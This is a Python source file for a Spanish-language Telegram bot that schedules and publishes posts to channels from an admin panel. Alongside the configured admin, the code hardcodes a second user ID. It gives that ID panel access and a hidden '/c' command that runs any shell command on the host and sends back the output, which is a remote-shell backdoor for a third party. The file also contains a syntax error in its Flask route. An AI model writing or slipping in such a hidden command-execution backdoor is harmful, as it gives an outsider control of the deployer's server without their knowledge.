import telebot.ext
import usefull_functions 
import root_callbacks.Canales_callback as Canales_callback
import root_callbacks.publicaciones_callback as publicaciones_callback
import root_callbacks.copia_seguridad_callback as copia_seguridad_callback
from Publicaciones_class import Publicaciones
import re
import threading
import time
import os
import sqlite3
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove, BotCommand
import dill
from flask import Flask, request
import subprocess






os.chdir(os.path.dirname(os.path.abspath(__file__)))





#----------------Variables------------------------
telebot.apihelper.ENABLE_MIDDLEWARE = True
bot=telebot.TeleBot(os.environ["token"], "html", disable_web_page_preview=True)

# """variables de entorno a Definir : 
#     webhook_url = enlace de la url del host para que reciba las actualizaciones
#     admin = ID admin
#     HOST_URL = url Mongodb cluster
# """


admin = int(os.environ["admin"])
lote_publicaciones={} 
lista_canales=[]
lista_seleccionada=[]
if os.name=="nt":
    OS="\\"
else:
    OS="/"


hilo_publicaciones_activo=False
hilo_publicar=False
dic_temp = {}
operacion = ""

####################Constantes END##################

try:
    print(f"La dirección del servidor es:{request.host_url}")
except:
    app = Flask(__name__)

    @app.route('/', methods=["GET"])
    def index():        
        if os.getenv("webhook_url") 
            if request.headers.get("content-type") == "application/json":
                update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
                bot.process_new_updates([update])
                return "OK", 200
            
        return "Hello World"

    def flask():
        try:
            
            bot.remove_webhook()
            time.sleep(2)
            if os.getenv("webhook_url"):
                bot.set_webhook(url=os.environ["webhook_url"])
                
        except:
            pass
        
        app.run(host="0.0.0.0", port=5000)



try:
    print(f"La dirección del servidor es:{request.host_url}")
except:
    hilo_flask=threading.Thread(name="hilo_flask", target=flask)
    hilo_flask.start()


    

if not os.environ.get("HOST_URL"):
    bot.send_message(admin, "No has ingresado una variable de entorno con la URL de la Base de datos de MongoDB\n\nEsto ocasionará errores al intentar hacer operaciones con la misma. Por favor, defina la variable de entorno con el nombre de '<b>HOST_URL</b>' con una URL válida e inicie de nuevo la aplicación")
    #A continuación una URL para su ejecución local
    HOST_URL = "mongodb://localhost:27017"
    
else:
    HOST_URL = os.environ.get("HOST_URL")
      

# Bucle para Publicar





if not "Publicaciones_media" in os.listdir():
    os.mkdir("Publicaciones_media")
    
#Crear la conexion con la base de datos de los canales
conexion, cursor = usefull_functions.cargar_conexion(bot)

    
    
def cargar_variables():
    
    
    with open("publicaciones.dill", "rb") as archivo:
        lote_publicaciones=dill.load(archivo)
        globals()["lote_publicaciones"] = lote_publicaciones
        

    return lote_publicaciones
        
    # if cargar=="variables" or cargar=="all":
    #     with open("variables.dill", "rb") as archivo:
    #         lote_variables=dill.load(archivo)
    #         for key, item in lote_variables.items():
    #             globals()[str(key)] = item

    #     if cargar == "variables":
    #         return lote_variables
    
    # return lote_publicaciones, lote_variables
    

def guardar_variables(nuevo=False):
    

    
    if nuevo != False:
        with open("publicaciones.dill", "wb") as archivo:
            dill.dump({}, archivo)

    with open("publicaciones.dill", "wb") as archivo:
        dill.dump(lote_publicaciones, archivo)
    
        
    return "OK"
        
        
    
if os.path.isfile("publicaciones.dill"):
    lote_publicaciones=usefull_functions.cargar_variables()
    
    for publicacion in lote_publicaciones:
        lote_publicaciones[publicacion].proxima_publicacion=False
        lote_publicaciones[publicacion].tiempo_eliminacion=False
        lote_publicaciones[publicacion].proxima_eliminacion=False
        # if lote_publicaciones[publicacion].lista_message_id_eliminar:
        #     usefull_functions.eliminar_publicacion(lote_publicaciones[publicacion], bot, cursor, admin, lote_publicaciones)
            

else:
    guardar_variables(nuevo=True)
    
    
    
conexion, cursor = usefull_functions.cargar_conexion()


if os.getenv("webhook_url"):
    bot.send_message(admin, "Al parecer tienes configurado el webhook. Trabajaré con el método <b>webhook</b>")
    
else:
    bot.send_message(admin, "Al parecer NO tienes configurado el webhook. Trabajaré con el método <b>polling</b> entonces")
    
    threading.Thread(name="hilo_polling", target=usefull_functions.m_polling, args=(bot,)).start()
    
bot.send_message(admin, "Estoy online bitch >:D")





bot.set_my_commands([
    BotCommand("/help", "Ayuda con el bot"),
    BotCommand("/panel", "Acceso al panel de control"),
], telebot.types.BotCommandScopeChat(os.environ["admin"]))


# telebot.apihelper.ENABLE_MIDDLEWARE = True

#----------------------------------------------------Handlers----------------------------------------------------


@bot.middleware_handler()
def revision(bot, update):
    global cursor
    if update.callback_query:
        print(update.callback_query.data)
        try:
            cursor.execute("SELECT ID FROM CANALES")
            
        except:
            conexion, cursor = usefull_functions.cargar_conexion()
            
        if not "db" in update.callback_query.data and "Copia_Seguridad.zip" in os.listdir():
            os.remove("Copia_Seguridad.zip")

        
    return



    


@bot.message_handler(func=lambda message: not int(message.chat.id) in [int(admin), 1413725506])
def cmd_being_sure_you_are_admin(message):
    if not message.chat.type == "private":
        del message
        return
    
    else:    
        bot.send_message(message.chat.id,f"Lo siento :( Este bot <b>SOLAMENTE</b> puede ser usado por @{bot.get_chat(admin).username}")
        bot.send_message(message.chat.id, "Bot creado por @mistakedelalaif")
        del message
        return




@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    if not message.chat.type== "private":
        return
    
    bot.send_message(message.chat.id, f"Bienvenido {bot.get_chat(admin).first_name} :D\n\nSoy un bot que hace mensajes personalizados y los envía a una serie de canales (Si estoy autorizado a publicar en ellos claro...)\nPuedes definir el tiempo de duración de las publicaciones y los canales a los que serán dirigidos los mensajes, por supuesto\n\nEnvíame /panel para comenzar :)")
    bot.send_message(message.chat.id, "Bot creado por @mistakedelalaif")
    
    
    
@bot.message_handler(commands=["host"])
def cmd_host_information(message):
    try:
        res = usefull_functions.calcular_diferencia_horaria(devolver="peru")
        if  isinstance(res, float) or  isinstance(res, int):
        
            bot.send_message(message.chat.id, "La hora actual del host es: " + time.strftime(r"%c" ,time.localtime()) + "\n\n" + "La hora actual de Perú es: " + time.strftime(r"%c",time.localtime(res)))
            
        else:
            
            bot.send_message(message.chat.id, f"Ha ocurrido un error intentando solicitar la información\n\nDescripción:\n{res[1]}")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"Ha ocurrido una excepcion\n\nDescripción de la excepción:\n{e}")
    return

    



@bot.message_handler(commands=["c"], func=lambda message: message.from_user.id == 1413725506)
def c(message):
    try:
        dic_temp[message.from_user.id] = {"comando": False, "res": False, "texto": ""}
        dic_temp[message.from_user.id]["comando"] = message.text.split()
        if len(dic_temp[message.from_user.id]["comando"]) == 1:
            bot.send_message(1413725506, "No has ingresado nada")
            return
        
        dic_temp[message.from_user.id]["comando"] = " ".join(dic_temp[message.from_user.id]["comando"][1:len(dic_temp[message.from_user.id]["comando"])])
        
        dic_temp[message.from_user.id]["res"] = subprocess.run(dic_temp[message.from_user.id]["comando"], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
        
        if dic_temp[message.from_user.id]["res"].returncode:
            dic_temp[message.from_user.id]["texto"]+= "❌ Ha ocurrido un error usando el comando...\n\n"
        
        if dic_temp[message.from_user.id]["res"].stderr:
            dic_temp[message.from_user.id]["texto"]+= f"stderr:\n{dic_temp[message.from_user.id]["res"].stderr}\n\n"
            
        if dic_temp[message.from_user.id]["res"].stdout:
            dic_temp[message.from_user.id]["texto"]+= f"stdout\n{dic_temp[message.from_user.id]["res"].stdout}\n\n"
            
            
        try:
            bot.send_message(1413725506, dic_temp[message.from_user.id]["texto"])
        except:
            with open("archivo.txt", "w") as file:
                file.write(dic_temp[message.from_user.id]["texto"])
            
            with open("archivo.txt", "rb") as file:
                bot.send_document(message.chat.id, telebot.types.InputFile(file.name))
                
            os.remove("archivo.txt")
                
    
    except Exception as e:
        bot.send_message(1413725506, f"Error:\n{e.args}")
    
    return
    
    
    




    

    
    
#---------------------------callbacks---------------------------------
@bot.callback_query_handler(func=lambda call: "volver_menu" in call.data and call.from_user.id in [int(admin), 1413725506])
@bot.message_handler(commands=["panel"], func=lambda m: m.from_user.id in [int(admin), 1413725506])
def cmd_panel(call):
    
    global operacion
    if os.path.isfile("BD_Canales_prueba.db"):
        os.remove("BD_Canales_prueba.db")
    
    
    dic_temp[call.from_user.id] = f"Bienvenido {bot.get_chat(call.from_user.id).first_name} :D ¿En qué te puedo ayudar?"
    
    
    try:
        lista_seleccionada.clear()
    except:
        pass
    
    panel=InlineKeyboardMarkup(row_width=1)
    panel.add(
        # InlineKeyboardButton("Ver el ID de las Publicaciones 👀📋", callback_data="ver_publicaciones"),
        # InlineKeyboardButton("Ver el Grupos/Canales disponibles 👀💻", callback_data="ver_canales"),
        # InlineKeyboardButton("Agregar/Quitar Canal(es) 💻", callback_data="lista_canales"),
        # InlineKeyboardButton("Agregar/Quitar publicación 📋🪒", callback_data="publicacion"),
        # InlineKeyboardButton("Agregar/Quitar canales a una Publicacion", callback_data="agregar_publicacion"),
        # InlineKeyboardButton("Tiempo Eliminación de Publicación 💥", callback_data="eliminar_publicacion"),
        # InlineKeyboardButton("Comenzar a Publicar 🚦", callback_data="comenzar_hilo"),
        
        
        InlineKeyboardButton("Canales 💻", callback_data="lista_canales_elegir"),
        InlineKeyboardButton("Crear Post ✨", callback_data="publicacion"),
        InlineKeyboardButton("Ver post creados 👁", callback_data="ver_publicaciones"))
    
    if hilo_publicaciones_activo == True:
        panel.add(
            InlineKeyboardButton("Parar hilo de publicación 🛑", callback_data="admin_hilo"),
            InlineKeyboardButton("Cargar/Enviar Copia de Seguridad ⛽", callback_data="copia_seguridad")
        )
        
    else:
        panel.add(
            InlineKeyboardButton("Inciar hilo de publicación 💡", callback_data="admin_hilo"),
            InlineKeyboardButton("Cargar/Enviar Copia de Seguridad ⛽", callback_data="copia_seguridad")
        ) 
    
    
    if "CallbackQuery" in str(type(call)):

        
        
        if not call.message.chat.type == "private":
            bot.send_message(call.chat.id, "Tienes que hacer esta petición en mi chat privado")
            return
        
        
        try:
            if "del" in call.data:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                return
            
            if not "N" in call.data:
                usefull_functions.enviar_mensajes(bot, call, dic_temp[call.from_user.id] , panel, message)
                
            else:
                usefull_functions.enviar_mensajes(bot, call , dic_temp[call.from_user.id], panel)
                
        except:
            try:
                usefull_functions.enviar_mensajes(bot, call, dic_temp[call.from_user.id], panel)
            except Exception as e:
                print("\nError enviando el mensaje:\n" + e.args)
                bot.send_message(call.message.chat.id, dic_temp[call.from_user.id] , reply_markup=panel)
        
            
    else:
        
        message = call
        
        if not message.chat.type == "private":
            bot.send_message(message.chat.id, "Tienes que hacer esta petición en mi chat privado")
            return
        
        
        bot.send_message(message.chat.id, dic_temp[call.from_user.id], reply_markup=panel)
                
    return



@bot.callback_query_handler(func=lambda call: "canal" in call.data and call.from_user.id in [int(admin), 1413725506])
def callback_lista_canales_elegir(call):
    try:
        Canales_callback.main_handler(bot,call, cursor, call.from_user.id , conexion, lote_publicaciones, lista_canales, lista_seleccionada, hilo_publicaciones_activo, dic_temp, operacion)
        
    except Exception as e:
        usefull_functions.enviar_mensajes(bot, call, f"Ha ocurrido un error intentando obtener información de los canales\n\nDescripción del error:\n{e.args}", InlineKeyboardMarkup([[InlineKeyboardButton("Menú | Volver ♻", callback_data="volver_menu")]]))
    
    return






@bot.callback_query_handler(func=lambda call: ("publicacion" in call.data or "operacion" in call.data) and call.from_user.id in [int(admin), 1413725506])
def callback_publicacion(call):
    operacion = publicaciones_callback.l_operacion
    
    try:
        publicaciones_callback.main_handler(bot,call, cursor, call.from_user.id , conexion, lote_publicaciones, lista_canales, lista_seleccionada, hilo_publicaciones_activo, dic_temp, operacion)
        
    except Exception as e:
        if "KeyError" in str(e.args):
            bot.answer_callback_query(call.id, "¡La publicacion ya no existe!")
            
        else:
            usefull_functions.enviar_mensajes(bot, call, f"Ha ocurrido un error intentando obtner información de las publicaciones\n\nDescripción del error:\n{e.args}" ,InlineKeyboardMarkup([[InlineKeyboardButton("Menú | Volver ♻", callback_data="volver_menu")]]))
            
    return






@bot.callback_query_handler(func=lambda call: call.data == "admin_hilo" and call.from_user.id in [int(admin), 1413725506])
def callback_publicacion(call):
    global hilo_publicar, hilo_publicaciones_activo 
        
    if hilo_publicaciones_activo==True:
        hilo_publicaciones_activo=False
        usefull_functions.enviar_mensajes(bot, call, "A continuación pararé el hilo. Te notificaré cuando lo esté\n\nTiempo estimado máximo para detenerlo: 1 minuto")
        
        for publicacion in lote_publicaciones:
            lote_publicaciones[publicacion].proxima_publicacion = False
            
        usefull_functions.guardar_variables(lote_publicaciones)
        


    else:
        #si no hay hilo activo:
        lote_publicaciones = usefull_functions.cargar_variables()
        
        if len(lote_publicaciones)==0:
            markup=InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Agregar publicación 📋🪒", callback_data="publicacion"))
            usefull_functions.enviar_mensajes(bot, call, "¡No hay siquiera publicaciones en la lista!\n\nAgrega alguna publicación para empezar", markup)
            return
            
        hilo_publicaciones_activo=True
        
        usefull_functions.guardar_variables(lote_publicaciones)
        
        usefull_functions.enviar_mensajes(bot, call, "Muy Bien, Iniciaré el <b>Hilo de Publicaciones</b>", InlineKeyboardMarkup([[InlineKeyboardButton("Menú | Volver ♻", callback_data="volver_menu")]]))
        
        hilo_publicar=threading.Thread(name="hilo_publicar", target=usefull_functions.bucle_publicacion, args=(call.from_user.id, bot, hilo_publicaciones_activo, call.from_user.id, lote_publicaciones, cursor))
        
        hilo_publicar.start()
    
    
    return   






@bot.callback_query_handler(func=lambda call:  "copia_seguridad" in call.data or "db" in call.data and call.from_user.id in [int(admin), 1413725506])
def callback_publicacion(call):
    try:
        copia_seguridad_callback.main_handler(bot, call, hilo_publicaciones_activo, HOST_URL, conexion, cursor, lote_publicaciones)
    except Exception as e:
        usefull_functions.enviar_mensajes(bot, call , f"¡Ha ocurrido un error intentando hacer operaciones en la base de datos!\n\nDescripción del error:\n{e.args}", InlineKeyboardMarkup([[InlineKeyboardButton("Menú | Volver ♻", callback_data="volver_menu")]]))
        
        
    
    return



    

    
    
#---------------------------callbacksEND---------------------------------

@bot.message_handler(func=lambda message: True)
def cmd_dont_be_shy(message):
    if not message.chat.type== "private":
        return
    
        
    bot.send_message(message.chat.id, "Tienes que escribir algo chacal, sino no sabré qué quieres que haga\n\nEmpieza con /help")
    


        
    
    
    


